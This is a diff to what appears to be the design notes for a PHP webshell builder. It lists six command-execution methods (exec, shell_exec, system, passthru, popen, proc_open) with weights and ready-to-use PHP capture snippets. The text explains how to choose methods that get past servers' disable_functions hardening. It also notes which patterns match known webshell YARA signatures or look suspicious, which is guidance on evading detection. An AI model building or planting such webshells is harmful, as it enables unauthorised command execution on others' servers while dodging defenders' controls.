@@ -173,14 +173,52 @@ At each position, a method is drawn proportionally to its remaining weight. This
 
 The weight hierarchy reflects practical reliability per method:
 
-| Method | Weight | Why |
-|---|---|---|
-| `exec` | 5 | Captures output via array reference — no buffering, no stream handling. Cleanest capture path, most widely available when exec functions are not fully disabled. |
-| `shell_exec` | 4 | Returns output as a string directly. Equally clean, slightly lower weight than `exec` because it returns `null` on error with no distinction from empty output. |
-| `system` | 3 | Writes directly to stdout — requires `ob_start`/`ob_get_contents`/`ob_end_clean` to capture. If any of those three buffering functions are also disabled, the method silently produces no output. |
-| `passthru` | 2 | Same stdout issue as `system`, but designed for binary output. Marginally less common in default PHP installs. Same `ob_*` dependency. |
-| `popen` | 2 | Returns a file handle — requires a `fread` loop and `pclose`. More moving parts; stream may return partial output if the handle closes early. |
-| `proc_open` | 2 | Most capable (full pipe control, stderr separation), but also the most complex. Requires `$pipes` array, `stream_get_contents`, `proc_close`. Any step failing silently means no output. Weight is low because of this complexity — but it was added precisely because sysadmins frequently forget it in `disable_functions`, making it available when all other methods are blocked. Last-resort value, not primary. |
+**`exec` — weight 5 (core)**
+```php
+exec($cmd, $_out);
+$output = implode("\n", $_out);
+```
+Runs the command via `/bin/sh -c`. Output is captured into `$_out` by reference as an array of lines — no stdout redirection, no buffering functions needed. Cleanest capture path. `exec` is the most commonly available PHP exec function on servers where the group is only partially restricted.
+
+**`shell_exec` — weight 4 (core)**
+```php
+$output = (string) shell_exec($cmd);
+```
+Functional equivalent of the backtick operator — same internal handler in PHP. Returns the full output as a string. Slightly lower weight than `exec` because it returns `null` on error with no distinction from an empty output, making silent failures harder to detect. If `shell_exec` is in `disable_functions`, the backtick `` `$cmd` `` is also blocked — they share the same PHP handler.
+
+**`system` — weight 3 (core)**
+```php
+ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean();
+```
+Writes output directly to stdout — requires three output buffering functions (`ob_start`, `ob_get_contents`, `ob_end_clean`) to capture it into a variable. If any of those is also in `disable_functions`, the method silently returns nothing. The `ob_start(); system(...); ob_get_contents()` pattern is itself a known YARA signature for PHP webshells.
+
+**`passthru` — weight 2 (optional)**
+```php
+ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean();
+```
+Identical to `system` in terms of capture mechanics — same `ob_*` dependency, same failure surface. Designed for raw binary output (no newline translation). Slightly less common than `system` in legitimate PHP codebases, so its presence is marginally more suspicious. Droppable.
+
+**`popen` — weight 2 (optional)**
+```php
+$h = popen($cmd, 'r');
+if (is_resource($h)) {
+    while (!feof($h)) { $output .= fread($h, 4096); }
+    pclose($h);
+}
+```
+Opens a pipe to the process and returns a file handle. Requires a read loop with `fread` and explicit `pclose`. More moving parts than the above — the stream can return partial output if the handle closes early or the process produces no output before the first `feof` check. `popen` has legitimate uses (reading compressed streams, running scripts) so it is sometimes left out of `disable_functions` on partially hardened servers. Droppable.
+
+**`proc_open` — weight 2 (optional)**
+```php
+$desc = [1 => ['pipe','w'], 2 => ['pipe','w']];
+$pr = proc_open($cmd, $desc, $pipes);
+if (is_resource($pr)) {
+    $output = stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+    proc_close($pr);
+}
+```
+Most capable of the six — gives full control over stdin, stdout and stderr as separate pipes. Requires `$pipes` array management, `stream_get_contents`, and `proc_close`. Most complex failure surface: any step failing silently means no output. Weight is low for this reason. Added specifically because sysadmins frequently omit it from `disable_functions` — making it available on servers where all other methods are blocked. Acts as a last-resort fallback, not a primary path. Droppable.
 
 ```
 # Three example builds
